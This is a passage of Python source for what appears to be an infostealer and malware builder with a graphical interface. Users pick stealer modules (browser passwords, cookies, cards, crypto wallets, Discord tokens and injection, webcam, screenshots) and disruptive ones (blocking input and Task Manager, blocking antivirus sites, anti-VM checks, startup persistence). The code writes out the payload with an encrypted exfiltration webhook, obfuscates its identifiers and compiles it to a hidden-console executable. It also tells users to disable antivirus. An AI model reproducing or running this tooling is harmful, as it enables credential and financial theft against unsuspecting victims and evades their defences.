    option_discord_injection_cb = ctk.CTkCheckBox(options_stealer_frame, text="Discord Injection", variable=option_discord_injection_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_passwords_cb = ctk.CTkCheckBox(options_stealer_frame, text="Passwords", variable=option_passwords_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_cookies_cb = ctk.CTkCheckBox(options_stealer_frame, text="Cookies", variable=option_cookies_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_history_cb = ctk.CTkCheckBox(options_stealer_frame, text="Browsing History", variable=option_history_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_downloads_cb = ctk.CTkCheckBox(options_stealer_frame, text="Download History", variable=option_downloads_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_cards_cb = ctk.CTkCheckBox(options_stealer_frame, text="Cards", variable=option_cards_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_extentions_cb = ctk.CTkCheckBox(options_stealer_frame, text="Extentions", variable=option_extentions_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_interesting_files_cb = ctk.CTkCheckBox(options_stealer_frame, text="Interesting Files", variable=option_interesting_files_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_webcam_cb = ctk.CTkCheckBox(options_stealer_frame, text="Webcam", variable=option_webcam_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_screenshot_cb = ctk.CTkCheckBox(options_stealer_frame, text="Screenshot", variable=option_screenshot_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    
    option_block_key_cb = ctk.CTkCheckBox(options_malware_frame, text="Block Key", variable=option_block_key_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_mouse_cb = ctk.CTkCheckBox(options_malware_frame, text="Block Mouse", variable=option_block_mouse_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_task_manager_cb = ctk.CTkCheckBox(options_malware_frame, text="Block Task Manager", variable=option_block_task_manager_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_website_cb = ctk.CTkCheckBox(options_malware_frame, text="Block AV Website", variable=option_block_website_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_shutdown_cb = ctk.CTkCheckBox(options_malware_frame, text="Shutdown", variable=option_shutdown_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_fake_error_cb = ctk.CTkCheckBox(options_malware_frame, text="Fake Error", variable=option_fake_error_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], command=CreateFakeErrorWindow)
    option_spam_open_programs_cb = ctk.CTkCheckBox(options_malware_frame, text="Spam Open Program", variable=option_spam_open_programs_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_spam_create_files_cb = ctk.CTkCheckBox(options_malware_frame, text="Spam Create File", variable=option_spam_create_files_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_anti_vm_and_debug_cb = ctk.CTkCheckBox(options_malware_frame, text="Anti VM & Debug", variable=option_anti_vm_and_debug_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_startup_cb = ctk.CTkCheckBox(options_malware_frame, text="Launch at Startup", variable=option_startup_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_restart_cb = ctk.CTkCheckBox(options_malware_frame, text="Restart Every 5min", variable=option_restart_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    
    option_system_cb.grid(row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_wallets_cb.grid(row=2, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_game_launchers_cb.grid(row=3, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_apps_cb.grid(row=4, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_roblox_cb.grid(row=5, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_discord_cb.grid(row=6, column=0, padx=(60, 0), pady=3, sticky="nswe")

    option_discord_injection_cb.grid(row=1, column=1, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_passwords_cb.grid(row=2, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_cookies_cb.grid(row=3, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_history_cb.grid(row=4, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_downloads_cb.grid(row=5, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_cards_cb.grid(row=6, column=1, padx=(0, 0), pady=3, sticky="nswe")

    option_extentions_cb.grid(row=1, column=2, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_interesting_files_cb.grid(row=2, column=2, padx=(0, 0), pady=3, sticky="nswe")
    option_webcam_cb.grid(row=3, column=2, padx=(0, 0), pady=3, sticky="nswe")
    option_screenshot_cb.grid(row=4, column=2, padx=(0, 0), pady=3, sticky="nswe")

    option_block_key_cb.grid(row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_block_mouse_cb.grid(row=2, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_block_task_manager_cb.grid(row=3, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_block_website_cb.grid(row=4, column=0, padx=(60, 0), pady=3, sticky="nswe")

    option_spam_open_programs_cb.grid(row=1, column=1, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_spam_create_files_cb.grid(row=2, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_shutdown_cb.grid(row=3, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_fake_error_cb.grid(row=4, column=1, padx=(0, 0), pady=3, sticky="nswe")

    option_anti_vm_and_debug_cb.grid(row=1, column=2, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_startup_cb.grid(row=2, column=2, padx=(0, 0), pady=3, sticky="nswe")
    option_restart_cb.grid(row=3, column=2, padx=(0, 0), pady=3, sticky="nswe")
    
    
    build_frame = ctk.CTkFrame(builder, width=720, height=40, fg_color=colors["background"]) 
    build_frame.grid(row=4, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    build_frame.grid_propagate(False)
    build_frame.grid_columnconfigure(0, weight=1)
    build_frame.grid_columnconfigure(1, weight=1)
    build_frame.grid_columnconfigure(2, weight=1)

    name_file_entry = ctk.CTkEntry(build_frame, height=30, width=140, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=12), justify="center", border_color=colors["red"], text_color=colors['white'], fg_color=colors["dark_gray"], border_width=2, placeholder_text="File Name")
    name_file_entry.grid(row=1, column=0, padx=0, sticky="w", pady=0)

    def FileTypeChanged(*args):
        if file_type_var.get() == "Python File":
            icon_button.configure(state="disabled")
        elif file_type_var.get() == "File Type":
            icon_button.configure(state="disabled")
        else:
            icon_button.configure(state="normal")

    file_type_menu = ctk.CTkOptionMenu(build_frame, height=30, width=140, font=ctk.CTkFont(family="Helvetica", size=12), variable=file_type_var, values=["Python File", "Exe File"], fg_color=colors['dark_gray'], button_color=colors["red"], button_hover_color=colors['dark_red'])
    file_type_menu.grid(row=1, column=2, sticky="w", padx=0, pady=0)

    icon_button = ctk.CTkButton(build_frame, height=30, width=140, text="Select Icon", command=ChooseIcon, fg_color=colors["red"], hover_color=colors["dark_red"], text_color_disabled=colors["light_gray"])
    icon_button.grid(row=1, column=2, sticky="e", padx=0, pady=0)
    icon_button.configure(state="disabled")
    file_type_var.trace_add("write", FileTypeChanged)

    build_frame.grid_columnconfigure(0, minsize=0)

    def BuildSettings():
        global option_system, option_game_launchers, option_wallets, option_apps, option_discord, option_discord_injection, option_passwords, option_cookies, option_history, option_downloads, option_cards, option_extentions, option_interesting_files, option_roblox, option_webcam, option_screenshot, option_block_key, option_block_mouse, option_block_task_manager, option_block_website, option_spam_open_programs, option_spam_create_files, option_shutdown ,option_fake_error,  option_startup, option_restart, option_anti_vm_and_debug, webhook, name_file, file_type, icon_path
        
        option_system = option_system_var.get()
        option_game_launchers = option_game_launchers_var.get()
        option_wallets = option_wallets_var.get()
        option_apps = option_apps_var.get()
        option_discord = option_discord_var.get()
        option_discord_injection = option_discord_injection_var.get()
        option_passwords = option_passwords_var.get()
        option_cookies = option_cookies_var.get()
        option_history = option_history_var.get()
        option_downloads = option_downloads_var.get()
        option_cards = option_cards_var.get()
        option_extentions = option_extentions_var.get()
        option_interesting_files = option_interesting_files_var.get()
        option_roblox = option_roblox_var.get()
        option_webcam = option_webcam_var.get()
        option_screenshot = option_screenshot_var.get()
        option_block_website = option_block_website_var.get()
        option_block_key = option_block_key_var.get()
        option_block_mouse = option_block_mouse_var.get()
        option_block_task_manager = option_block_task_manager_var.get()
        option_shutdown = option_shutdown_var.get()
        option_spam_open_programs = option_spam_open_programs_var.get()
        option_spam_create_files = option_spam_create_files_var.get()
        option_fake_error = option_fake_error_var.get()
        option_startup = option_startup_var.get()
        option_restart = option_restart_var.get()
        option_anti_vm_and_debug = option_anti_vm_and_debug_var.get()
        webhook = webhook_url.get()
        name_file = name_file_entry.get()
        file_type = file_type_var.get()

        if not webhook.strip():
            ErrorLogs("Please enter the webhook.")
            return
        
        if not name_file.strip():
            ErrorLogs("Please choose the file name.")
            return
        
        if file_type == "File Type":
            ErrorLogs("Please choose the file type.")
            return
        
        ClosingBuild()

    build = ctk.CTkButton(builder, text="Build", command=BuildSettings, height=40, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    build.grid(row=5, column=0, padx=330, pady=30, sticky="nswe")

    builder.protocol("WM_DELETE_WINDOW", ClosingWindow)
    builder.mainloop()

    if not exit_window:
        builder.destroy()

    time.sleep(1)

    if file_type == "File Type" or file_type == "None" or not name_file.strip() or name_file == "None" or not webhook.strip() or webhook == "None":
        ErrorLogs("You have closed the page, so your virus will not be built.")
        Continue()
        Reset()

    option_extentions = option_extentions_var.get()
    option_interesting_files = option_interesting_files_var.get()   

    print(f"""
    {red}Stealer Options:{white}
    {option_system} System Info            {option_discord_injection} Discord Injection      {option_extentions} Extentions
    {option_wallets} Wallets Session Files  {option_passwords} Passwords              {option_interesting_files} Interesting Files                   
    {option_game_launchers} Games Session Files    {option_cookies} Cookies                {option_webcam} Webcam 
    {option_apps} Telegram Session Files {option_history} Browsing History       {option_screenshot} Screenshot
    {option_roblox} Roblox Accounts        {option_downloads} Download History
    {option_discord} Discord Accounts       {option_cards} Cards

    {red}Malware Options:{white}
    {option_block_key} Block Key              {option_shutdown} Shutdown               {option_anti_vm_and_debug} Anti VM & Debug
    {option_block_mouse} Block Mouse            {option_fake_error} Fake Error             {option_startup} Launch at Startup
    {option_block_task_manager} Block Task Manager     {option_spam_open_programs} Spam Open Program      {option_restart} Restart Every 5min
    {option_block_website} Block AV Website       {option_spam_create_files} Spam Create File
""".replace("Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace("Disable", f"{BEFORE}x{AFTER}"))

    if option_fake_error == "Enable":
        print(f"""{red}Fake Error Title   : {white + fake_error_title}
{red}Fake Error Message : {white + fake_error_message}""")

    print(f"""{red}Webhook   : {white + webhook[:90] + '..'}
{red}File Type : {white + file_type}
{red}File Name : {white + name_file}""")

    if icon_path and icon_path != "None":
        if 100 < len(icon_path):
            icon_path_cut = icon_path[:100] + '..'
        else:
            icon_path_cut = icon_path
        print(f"{red}Icon Path : {white + icon_path_cut}")
    
    def Encryption(webhook):
        def Encrypt(decrypted, key):
            def DeriveKey(password, salt):
                kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
                if isinstance(password, str):  
                    password = password.encode()  
                return kdf.derive(password)
            
            salt = os.urandom(16)
            derived_key = DeriveKey(key, salt)
            iv = os.urandom(16)
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(decrypted.encode()) + padder.finalize()
            cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            encrypted_message = salt + iv + encrypted_data
            return base64.b64encode(encrypted_message).decode()
        
        key_encryption = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=random.randint(100,200)))
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Encryption key created: {white + key_encryption[:75] + '..'}")
        webhook_encrypted = Encrypt(webhook, key_encryption)
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Encrypted webhook: {white + webhook_encrypted[:75] + '..'}")

        return key_encryption, webhook_encrypted
    
    def PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted):
        if file_type in ["Exe File", "Python File"]:
            try:
                browser_choice = []
                if option_extentions == 'Enable':
                    browser_choice.append('extentions')
                if option_passwords == 'Enable':
                    browser_choice.append('passwords')
                if option_cookies == 'Enable':
                    browser_choice.append('cookies')
                if option_history == 'Enable':
                    browser_choice.append('history')
                if option_downloads == 'Enable':
                    browser_choice.append('downloads')
                if option_cards == 'Enable':
                    browser_choice.append('cards')

                session_files_choice = []
                if option_wallets == 'Enable':
                    session_files_choice.append('Wallets')
                if option_game_launchers == 'Enable':
                    session_files_choice.append('Game Launchers')
                if option_apps == 'Enable':
                    session_files_choice.append('Apps')

                with open(file_python, 'w', encoding='utf-8') as file:

                    if option_anti_vm_and_debug == 'Enable':
                        file.write(Ant1VM4ndD3bug)

                    file.write(Obligatory.replace("%WEBHOOK_URL%", webhook_encrypted).replace("%KEY%", key_encryption).replace("%LINK_AVATAR%", avatar_webhook).replace("%LINK_GITHUB%", github_tool).replace("%LINK_WEBSITE%", website))

                    if option_system == 'Enable':
                        file.write(Sy5t3mInf0)

                    if option_discord == 'Enable':
                        file.write(Di5c0rdAccount)

                    if option_discord_injection == 'Enable':
                        file.write(Di5c0rdIj3ct10n)

                    if option_interesting_files == 'Enable':
                        file.write(Int3r3stingFil3s)

                    if session_files_choice:
                        session_files_code = S3ssi0nFil3s.replace("SESSION_FILES_CHOICE", ', '.join([f'"{item}"' for item in session_files_choice]))
                        file.write(session_files_code)

                    if browser_choice:
                        browser_steal_code = Br0w53r5t341.replace("BROWSER_CHOICE", ', '.join([f'"{item}"' for item in browser_choice]))
                        file.write(browser_steal_code)

                    if option_roblox == 'Enable':
                        file.write(R0b10xAccount)

                    if option_webcam == 'Enable':
                        file.write(W3bc4m)

                    if option_screenshot == 'Enable':
                        file.write(Scr33n5h0t)

                    if option_block_key == 'Enable':
                        file.write(B10ckK3y)

                    if option_block_mouse == 'Enable':
                        file.write(B10ckM0u53)

                    if option_block_task_manager == 'Enable':
                        file.write(B10ckT45kM4n4g3r)

                    if option_block_website == 'Enable':
                        file.write(B10ckW3b5it3)

                    if option_fake_error == 'Enable':
                        file.write(F4k33rr0r(fake_error_title, fake_error_message))

                    if option_spam_open_programs == 'Enable':
                        file.write(Sp4m0p3nPr0gr4m)

                    if option_spam_create_files == 'Enable':
                        file.write(Sp4mCr34tFil3)

                    if option_shutdown == 'Enable':
                        file.write(Shutd0wn)

                    if option_startup == 'Enable':
                        file.write(St4rtup)

                    if option_spam_open_programs == 'Enable' or option_block_mouse == 'Enable' or option_spam_create_files == 'Enable':
                        file.write(Sp4mOpti0ns)

                    if option_restart == 'Enable':
                        file.write(R3st4rt)

                    file.write(St4rt)

                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
            except Exception as e:
                print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + str(e)}")
                Continue()
                Reset()

    def PythonIdentifierObfuscation(file_python):
        if file_type in ["Exe File", "Python File"]:
            try:
                variable_map = {}

                def RandomName():
                    return ''.join(random.choices(string.ascii_uppercase, k=random.randint(50,100)))

                with open(file_python, 'r', encoding='utf-8') as file:
                    original_script = file.read()

                def visit_node(node):
                    if isinstance(node, ast.Assign):
                        for target in node.targets:
                            if isinstance(target, ast.Name):
                                var_name = target.id
                                if var_name not in variable_map and "v4r_" in var_name:
                                    new_name = RandomName()
                                    variable_map[var_name] = new_name
                                    target.id = new_name

                    elif isinstance(node, ast.FunctionDef):
                        if "D3f_" in node.name: 
                            if node.name not in variable_map:
                                new_name = RandomName()
                                variable_map[node.name] = new_name
                                node.name = new_name 
                            for arg in node.args.args:
                                var_name = arg.arg
                                if var_name not in variable_map and "v4r_" in var_name:
                                    new_name = RandomName()
                                    variable_map[var_name] = new_name
                                    arg.arg = new_name

                    elif isinstance(node, ast.ClassDef):
                        if node.name not in variable_map and "v4r_" in node.name:
                            new_name = RandomName()
                            variable_map[node.name] = new_name
                            node.name = new_name

                    for child in ast.iter_child_nodes(node):
                        visit_node(child)

                tree = ast.parse(original_script)
                visit_node(tree)

                with open(file_python, 'r', encoding='utf-8') as file:
                    lines = file.readlines()

                with open(file_python, 'w', encoding='utf-8') as file:
                    for line in lines:
                        for var_name, new_name in variable_map.items():
                            if var_name in line:
                                line = line.replace(var_name, new_name)
                        file.write(line)

                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} All the Identifiers of the python file were obfuscated.")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Obfuscation failed: {white + str(e)}")

    def SendWebhook(webhook):
        try:
            embed_config = {
                'title': 'Virus Created (Config):',
                'color': color_webhook,
                "fields": [
                    {"name": "Name:", "value": f"""```{name_file}```""", "inline": True},
                    {"name": "Type:", "value": f"""```{file_type}```""", "inline": True},
                    {"name": "Webhook:", "value": f"""{webhook}""", "inline": False},
                ],
                'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                }
            }
            
            requests.post(webhook, json={'embeds': [embed_config], 'username': username_webhook, 'avatar_url': avatar_webhook}, headers={'Content-Type': 'application/json'})
        except:
            pass
        
    def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable..")

        try:
            try:
                import PyInstaller
            except ImportError:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Installing PyInstaller..")
                subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} PyInstaller installed successfully")

            script_path = os.path.abspath(file_python)
            working_directory = os.path.dirname(script_path)
            os.chdir(working_directory)

            pyinstaller_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--distpath", path_destination,
                "--noconsole",
                "--name", name_file,
                script_path
            ]

            if icon_path and os.path.exists(icon_path):
                pyinstaller_cmd.extend(['--icon', icon_path])

            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Running PyInstaller command...")
            
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=working_directory)

            if result.returncode == 0:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
                
                try:
                    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion..")
                    build_dir = os.path.join(working_directory, "build")
                    spec_file = os.path.join(working_directory, f"{name_file}.spec")
                    
                    if os.path.exists(build_dir):
                        shutil.rmtree(build_dir)
                    if os.path.exists(spec_file):
                        os.remove(spec_file)
                    if os.path.exists(file_python):
                        os.remove(file_python)
                    
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary files removed successfully")
                except Exception as e:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error removing temporary files: {white + str(e)}")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} PyInstaller failed with return code: {white + str(result.returncode)}")
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error output: {white + result.stderr}")
                Continue()
                Reset()
                
        except subprocess.CalledProcessError as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + str(e)}")
            Continue()
            Reset()
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Unexpected error during conversion: {white + str(e)}")
            Continue()
            Reset()

    file_python_relative = f'1-Output\\VirusBuilder\\{name_file}.py'
    file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")

    path_destination_relative = "1-Output\\VirusBuilder"
    path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")

    os.makedirs(path_destination, exist_ok=True)

    key_encryption, webhook_encrypted = Encryption(webhook)
    PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted)
    PythonIdentifierObfuscation(file_python)

    if file_type == "Exe File":
        if not os.path.exists(path_destination):
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, reinstall the tool and try again.")
            Continue()
            Reset()
        
        if os.path.exists(file_python):
            if not os.path.exists(icon_path) or icon_path == "None":
                ConvertToExe(file_python, path_destination, name_file)
            else:
                ConvertToExe(file_python, path_destination, name_file, icon_path)
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} The python file created previously was deleted, please remove your anti virus and try again.")

    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} The virus was created, it is found in: {white + path_destination_relative}")
    try: 
        if os.path.exists(path_destination):
            os.startfile(path_destination)
    except: 
        pass
    try: 
        SendWebhook(webhook)
    except: 
        pass
    Continue()
    Reset()

except Exception as e: 
    Error(e)